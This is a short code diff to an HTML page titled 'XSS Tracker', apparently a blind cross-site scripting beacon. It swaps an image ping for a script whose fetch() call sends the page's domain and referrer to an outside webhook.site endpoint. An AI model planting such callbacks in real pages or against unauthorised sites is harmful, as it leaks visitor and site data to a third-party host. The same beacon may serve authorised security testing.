@@ -4,6 +4,8 @@
     <title>XSS Tracker</title>
   </head>
   <body>
-    <img src="https://webhook.site/c1d5a5ee-5e6b-41b7-8957-d79b557d77ee?ping=greencolumnart" />
+    <script>
+      fetch("https://webhook.site/c1d5a5ee-5e6b-41b7-8957-d79b557d77ee?dom=" + document.domain + "&ref=" + document.referrer);
+    </script>
   </body>
 </html>
